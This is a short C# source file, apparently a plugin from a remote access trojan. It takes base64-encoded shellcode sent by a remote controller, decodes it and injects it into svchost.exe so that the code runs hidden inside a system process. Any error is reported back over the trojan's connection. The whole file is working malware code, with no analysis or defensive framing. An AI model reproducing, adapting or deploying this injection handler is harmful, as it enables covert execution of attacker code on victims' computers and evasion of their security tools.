using System;
using MessagePackLib.MessagePack;
using ShellLoader;

namespace Plugin.Handler
{
    public class HandleShellcodeInject
    {
        public HandleShellcodeInject(MsgPack unpack_msgpack)
        {
            Exec(unpack_msgpack.ForcePathObject("Shellcode").AsString);
        }

        public void Exec(string b64shellcode)
        {
            byte[] shellcode = Convert.FromBase64String(b64shellcode);

            var ldr = new Loader();
            try
            {
                ldr.Load("svchost.exe", shellcode);
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}
